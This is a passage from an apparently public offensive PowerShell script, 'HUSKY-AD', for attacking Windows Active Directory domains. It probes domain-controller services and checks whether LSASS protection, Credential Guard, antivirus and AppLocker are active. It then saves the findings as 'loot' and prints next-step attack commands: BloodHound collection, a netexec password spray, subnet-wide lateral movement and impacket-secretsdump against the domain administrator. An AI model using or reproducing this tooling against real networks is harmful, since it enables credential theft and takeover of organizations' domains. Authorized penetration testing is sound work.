        @{Port=3389; Service="RDP"},
        @{Port=5985; Service="WinRM"},
        @{Port=5986; Service="WinRM-S"},
        @{Port=9389; Service="ADWS"}
    )

    foreach ($p in $portsToCheck) {
        try {
            $tcp = New-Object System.Net.Sockets.TcpClient
            $connect = $tcp.BeginConnect($DomainController, $p.Port, $null, $null)
            $wait = $connect.AsyncWaitHandle.WaitOne(1000, $false)
            if ($wait -and $tcp.Connected) {
                Write-Sniff "Port $($p.Port) ($($p.Service)): OPEN"

                if ($p.Port -eq 1433) {
                    Add-Important "MSSQL on DC - check for xp_cmdshell, impersonation"
                    Write-Cmd "impacket-mssqlclient '$Domain/USER:PASS'@$DomainController -windows-auth"
                }
                if ($p.Port -eq 3389) {
                    Write-Cmd "xfreerdp /u:USER /p:PASS /v:$DomainController /cert-ignore"
                }
            }
            $tcp.Close()
        } catch {}
    }

    # LSASS protection
    Write-SubSection "Security Controls"
    try {
        $lsaProt = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue
        if ($lsaProt -and $lsaProt.RunAsPPL -eq 1) {
            Write-Track "LSA Protection (RunAsPPL): ENABLED"
        } else {
            Write-Growl "LSA Protection: NOT ENABLED - LSASS dumpable"
            Add-Important "LSA Protection disabled - can dump LSASS"
        }
    } catch {}

    try {
        $credGuard = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace "root\Microsoft\Windows\DeviceGuard" -ErrorAction SilentlyContinue
        if ($credGuard.SecurityServicesRunning -contains 1) {
            Write-Track "Credential Guard: ENABLED"
        } else {
            Write-Growl "Credential Guard: NOT ENABLED"
        }
    } catch {}

    # AMSI / AV check
    Write-SubSection "Defenses"
    try {
        $avProducts = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
        foreach ($av in $avProducts) {
            Write-Track "AV: $($av.displayName)"
        }
    } catch {
        Write-Track "Cannot query AV (might be server OS)"
    }

    # Windows Defender status
    try {
        $defender = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defender) {
            Write-Track "Defender Real-Time: $($defender.RealTimeProtectionEnabled)"
            Write-Track "Defender AMSI: $($defender.AMSIEnabled)"
        }
    } catch {}

    # Applocker
    try {
        $applocker = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue
        if ($applocker.RuleCollections.Count -gt 0) {
            Write-Track "AppLocker: CONFIGURED ($($applocker.RuleCollections.Count) rule collections)"
        } else {
            Write-Growl "AppLocker: NOT CONFIGURED"
        }
    } catch {}
}

# ═══════════════════════════════════════════════════════
# THE HUNT REPORT
# ═══════════════════════════════════════════════════════
Write-Section "THE HUNT REPORT"

Write-Host ""

if ($script:CriticalFindings.Count -gt 0) {
    Write-Host "  ${RED}${BLD}KILLS - CRITICAL FINDINGS ($($script:CriticalFindings.Count)):${RST}"
    foreach ($f in $script:CriticalFindings) {
        Write-Host "  ${RED}  [BITE!] $f${RST}"
    }
    Write-Host ""
}

if ($script:QuickWins.Count -gt 0) {
    Write-Host "  ${GRN}${BLD}EASY PREY - QUICK WINS ($($script:QuickWins.Count)):${RST}"
    foreach ($f in $script:QuickWins) {
        Write-Host "  ${GRN}  [SNIFF] $f${RST}"
    }
    Write-Host ""
}

if ($script:ImportantFindings.Count -gt 0) {
    Write-Host "  ${YEL}${BLD}SCENT TRAIL - WORTH INVESTIGATING ($($script:ImportantFindings.Count)):${RST}"
    foreach ($f in $script:ImportantFindings) {
        Write-Host "  ${YEL}  [GROWL] $f${RST}"
    }
    Write-Host ""
}

if ($script:CriticalFindings.Count -eq 0 -and $script:QuickWins.Count -eq 0 -and $script:ImportantFindings.Count -eq 0) {
    Write-Track "The trail is cold - no immediate escalation paths with current privileges"
    Write-Track "Keep hunting:"
    Write-Track "  1. Run BloodHound for ACL analysis"
    Write-Track "  2. Password spray with common passwords"
    Write-Track "  3. Check all SMB shares manually"
    Write-Track "  4. Look for other hosts on the network"
}

# Save summary
$summaryFile = "$OutputDir\hunt_report.txt"
"HUSKY-AD HUNT REPORT - $(Get-Date)" | Out-File $summaryFile
"Domain: $Domain | DC: $DomainController" | Out-File $summaryFile -Append
"User: $env:USERDOMAIN\$env:USERNAME" | Out-File $summaryFile -Append
"" | Out-File $summaryFile -Append
"=== CRITICAL ===" | Out-File $summaryFile -Append
$script:CriticalFindings | Out-File $summaryFile -Append
"" | Out-File $summaryFile -Append
"=== QUICK WINS ===" | Out-File $summaryFile -Append
$script:QuickWins | Out-File $summaryFile -Append
"" | Out-File $summaryFile -Append
"=== IMPORTANT ===" | Out-File $summaryFile -Append
$script:ImportantFindings | Out-File $summaryFile -Append

Write-Host ""
Write-Host "  ${BLD}Loot stashed in:${RST} $OutputDir\"
Get-ChildItem $OutputDir -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Track "  $($_.Name) ($([math]::Round($_.Length/1KB, 1)) KB)"
}

Write-Host ""
Write-Section "NEXT MOVES - KEEP THE HUNT GOING"

Write-Host "  ${CYN}1.${RST} Feed BloodHound:"
Write-Cmd ".\SharpHound.exe -c All --domain $Domain"
Write-Cmd "bloodhound-python -u USER -p PASS -d $Domain -ns $DomainController -c All"

Write-Host "  ${CYN}2.${RST} Spray the pack:"
Write-Cmd "netexec smb $DomainController -u $OutputDir\users.txt -p 'Company2026!' -d $Domain --continue-on-success"

Write-Host "  ${CYN}3.${RST} Run with the pack (lateral movement):"
Write-Cmd "netexec smb SUBNET/24 -u USER -p PASS -d $Domain --continue-on-success"

Write-Host "  ${CYN}4.${RST} Dump secrets (if DA):"
Write-Cmd "impacket-secretsdump '$Domain/Administrator'@$DomainController -hashes :HASH"

Write-Host ""
Write-Host "${CYN}  +-----------------------------------------------------+${RST}"
Write-Host "${CYN}  |${RST}  Hunt completed at $(Get-Date)  ${CYN}|${RST}"
Write-Host "${CYN}  +-----------------------------------------------------+${RST}"
Write-Host ""
Write-Host "  ${WHT}${BLD}`"The domain is a forest. Be the wolf.`"${RST}"
Write-Host "  ${CYN}-- The Husky Hacker | thehuskyhacker.com${RST}"
Write-Host ""
